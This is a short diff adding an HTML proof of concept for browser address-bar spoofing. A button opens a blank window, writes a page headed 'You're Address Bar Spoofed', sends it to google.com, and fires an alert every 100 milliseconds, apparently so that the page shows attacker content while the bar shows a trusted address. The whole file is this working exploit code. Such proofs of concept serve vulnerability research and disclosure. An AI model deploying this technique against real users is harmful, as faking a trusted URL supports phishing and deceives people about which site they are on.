@@ -1,0 +1,22 @@
+<button style="font-size: 50px;" onclick="spoof()">Click</button>
+
+<script>
+    function spoof(){
+        const w = window.open("about:blank")
+        w.document.write(`
+
+        <h1>You're Address Bar Spoofed</h1>
+
+        <script>
+            location.href = 'https://google.com'
+
+            setInterval(() =>{
+                alert('1')
+            }, 100)
+        <\/script>
+
+        `
+        )
+    }
+
+</script>
